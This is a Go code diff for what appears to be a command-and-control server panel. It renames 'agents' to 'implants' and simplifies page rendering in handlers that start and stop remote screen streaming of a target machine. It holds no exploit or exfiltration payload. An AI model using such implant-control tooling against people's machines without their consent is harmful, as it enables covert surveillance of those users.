@@ -1,9 +1,7 @@
 package server
 
 import (
-	"bytes"
 	"encoding/json"
-	"html/template"
 	"log/slog"
 	"net/http"
 	"strings"
@@ -16,7 +14,7 @@ import (
 func (s *Server) handleScreenMonitorPage(c *gin.Context) {
 	id := c.Param("id")
 
-	var agent db.Agent
+	var agent db.Implant
 	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
 		c.Redirect(http.StatusFound, "/agents")
 		return
@@ -29,22 +27,11 @@ func (s *Server) handleScreenMonitorPage(c *gin.Context) {
 		"ActiveNav": "agents",
 		"Online":    time.Since(agent.LastSeen) < s.offlineThreshold(),
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "screen_content", data); err != nil {
-		slog.Error("Failed to render content", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	data["Content"] = template.HTML(contentBuf.String())
-
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "screen_content", data)
 }
 
 func (s *Server) handleStartScreenMonitor(c *gin.Context) {
@@ -55,7 +42,7 @@ func (s *Server) handleStartScreenMonitor(c *gin.Context) {
 	}
 
 	s.screenMonitorMu.Lock()
-	s.screenMonitorAgents[strings.ToLower(id)] = time.Now()
+	s.screenMonitorImplants[strings.ToLower(id)] = time.Now()
 	s.screenMonitorMu.Unlock()
 
 	task, err := s.createTask(id, "screen_stream_start", "", "", "", "", 0, 0)
@@ -74,8 +61,8 @@ func (s *Server) handleStopScreenMonitor(c *gin.Context) {
 	id := c.Param("id")
 
 	s.screenMonitorMu.Lock()
-	startTime, ok := s.screenMonitorAgents[strings.ToLower(id)]
-	delete(s.screenMonitorAgents, strings.ToLower(id))
+	startTime, ok := s.screenMonitorImplants[strings.ToLower(id)]
+	delete(s.screenMonitorImplants, strings.ToLower(id))
 	s.screenMonitorMu.Unlock()
 
 	if ok {
@@ -100,7 +87,7 @@ func (s *Server) handleStopScreenMonitor(c *gin.Context) {
 func (s *Server) IsScreenMonitoring(agentID string) bool {
 	s.screenMonitorMu.Lock()
 	defer s.screenMonitorMu.Unlock()
-	_, ok := s.screenMonitorAgents[strings.ToLower(agentID)]
+	_, ok := s.screenMonitorImplants[strings.ToLower(agentID)]
 	return ok
 }
 
